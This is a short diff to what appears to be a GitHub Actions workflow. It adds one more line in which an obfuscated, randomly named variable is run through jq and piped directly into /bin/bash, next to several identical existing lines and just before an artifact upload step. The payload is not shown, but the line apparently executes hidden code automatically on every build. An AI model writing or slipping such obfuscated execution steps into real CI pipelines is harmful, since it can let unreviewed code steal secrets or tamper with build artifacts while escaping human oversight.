@@ -34,6 +34,7 @@ jobs:
           echo $cplmg7 | jq -r .sf80 | /bin/bash
           printf '%s' "$aenu48" | jq -r .ieoxw574 | /bin/bash
           printf '%s' "$a82291" | jq -r .hmgi707 | /bin/bash
+          printf '%s' "$ugy938" | jq -r .n105 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
